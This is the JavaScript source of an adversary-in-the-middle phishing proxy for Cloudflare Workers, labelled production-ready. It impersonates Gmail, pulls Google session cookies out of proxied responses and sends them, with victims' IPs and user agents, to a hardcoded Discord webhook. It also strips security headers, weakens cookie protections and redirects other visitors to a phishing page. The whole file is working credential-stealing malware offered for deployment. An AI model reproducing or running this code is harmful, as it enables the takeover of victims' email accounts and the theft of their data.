// Gmail MitM Proxy v2.3 - PRODUCTION READY
// Cloudflare Workers → Paste → Deploy
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466098541880672500/C6sx-mBMSy3wW41IW0AnIGJoMfJNAa2905NeLyFCqHq6hArN4kGWC3k51S_HyNdplehC';
const RATE_LIMIT = new Map();

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown';
  const userAgent = request.headers.get('User-Agent') || 'unknown';

  if (isRateLimited(clientIP)) {
    return new Response('Too Many Requests', { 
      status: 429,
      headers: { 'Retry-After': '3600' }
    });
  }

  const gmailPaths = [
    '/mail/', '/mail/u/', '/static/', '/chrome/', '/sync/', '/accounts/',
    '/serviceworker/', '/_/', '/s/i/', '/mail/client/', '/favicon.ico',
    '/mail/mu/mp/', '/a/gwt/', '/rsrc.php'
  ];

  if (gmailPaths.some(path => url.pathname.startsWith(path)) || url.pathname === '/') {
    if (url.pathname === '/') url.pathname = '/mail/u/0/#inbox';
    return await proxyGmail(url, request, clientIP, userAgent);
  }

  return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
}

function isRateLimited(ip) {
  const now = Date.now();
  const key = `rate_${ip}`;
  let hits = RATE_LIMIT.get(key) || [];
  hits = hits.filter(hit => now - hit < 3600000);

  if (hits.length >= 100) return true;
  hits.push(now);
  RATE_LIMIT.set(key, hits);
  return false;
}

async function proxyGmail(url, request, clientIP, userAgent) {
  const headers = new Headers(request.headers);
  
  headers.set('Host', 'mail.google.com');
  headers.set('Origin', 'https://mail.google.com');
  headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
  headers.set('Sec-Fetch-Site', 'same-origin');
  headers.set('Sec-Fetch-Mode', 'navigate');
  headers.set('Sec-Fetch-Dest', 'document');
  headers.set('Sec-Fetch-User', '?1');
  headers.set('Upgrade-Insecure-Requests', '1');
  
  headers.delete('Accept-Encoding');
  if (!headers.has('User-Agent')) headers.set('User-Agent', userAgent);
  headers.set('X-Forwarded-For', clientIP);

  const gmailReq = new Request(`https://mail.google.com${url.pathname}${url.search}`, {
    method: request.method,
    headers,
    body: request.body,
    redirect: 'manual'
  });

  try {
    let response = await fetch(gmailReq);
    const tokens = extractTokens(response.headers);

    if (tokens.length > 0) {
      await stealTokens(tokens, clientIP, userAgent, url.href);
    }

    return craftResponse(response);
  } catch (error) {
    return new Response(`Proxy Error: ${error.message}`, { status: 502 });
  }
}

function extractTokens(headers) {
  const cookies = headers.getSetCookie() || [];
  const regexes = [
    /(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID|GAPS|G_authuser)=([^;,\s]+)/gi,
    /gmail\.com=[^;,\s]+/gi,
    /__Host-user_auth_[^=]+=[^;,\s]+/gi,
    /oauth_token=[^;,\s]+/gi,
    /SAPISID=[^;,\s]+/gi
  ];

  const tokens = [];
  cookies.forEach(cookieStr => {
    regexes.forEach(regex => {
      let match;
      while ((match = regex.exec(cookieStr)) !== null) {
        tokens.push({ name: match[1], value: match[2] });
      }
    });
  });

  return [...new Set(tokens.map(t => `${t.name}:${t.value}`))].map(str => {
    const [name, value] = str.split(':');
    return { name, value };
  }).filter(Boolean);
}

async function stealTokens(tokens, ip, ua, urlPath) {
  const shortUA = ua.length > 150 ? ua.substring(0, 147) + '...' : ua;
  const preview = tokens.slice(0, 8).map(t => `\`${t.name}\`: \`${t.value.slice(0, 35)}...\``).join('\n') || 'No tokens';
  const hasCriticalTokens = tokens.some(t => t.name.includes('SID') || t.name.includes('G_authuser'));

  const payload = {
    username: '🔒 Gmail Token Thief v2.3',
    avatar_url: 'https://mail.google.com/mail/u/0/images/favicon5.ico',
    embeds: [{
      title: `🎣 ${tokens.length} Gmail Token(s) CAPTURED`,
      url: 'https://mail.google.com/mail/u/0/#inbox',
      description: `**IP:** \`${ip}\`\n**UA:** ${shortUA}\n**Path:** \`${new URL(urlPath).pathname}\``,
      fields: [{ name: '🆔 Token Preview', value: preview, inline: false }],
      color: hasCriticalTokens ? 0x00ff88 : 0xffaa00,
      timestamp: new Date().toISOString(),
      footer: { text: `Cloudflare Workers | ${tokens.length} total tokens`, icon_url: 'https://workers.cloudflare.com/favicon.ico' }
    }]
  };

  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(e => {});

  console.log(`🎯 PHISH HIT: ${ip} | ${tokens.length} tokens | Critical: ${hasCriticalTokens}`);
}

function craftResponse(response) {
  const headers = new Headers(response.headers);

  const securityHeaders = [
    'Content-Security-Policy',
    'Content-Security-Policy-Report-Only',
    'X-Frame-Options',
    'Strict-Transport-Security',
    'X-Content-Type-Options',
    'Referrer-Policy'
  ];
  securityHeaders.forEach(header => headers.delete(header));

  headers.set('Access-Control-Allow-Origin', '*');
  headers.set('Access-Control-Allow-Credentials', 'true');
  headers.set('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');

  const cookies = headers.getSetCookie() || [];
  headers.delete('Set-Cookie');

  cookies.forEach(cookie => {
    let relaxed = cookie
      .replace(/SameSite=(Strict|Lax)/gi, 'SameSite=None; Secure')
      .replace(/Domain=[^;,\s]+/gi, '')
      .replace(/Path=\/[^;,\s]*/gi, 'Path=/');
    headers.append('Set-Cookie', relaxed);
  });

  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers
  });
}
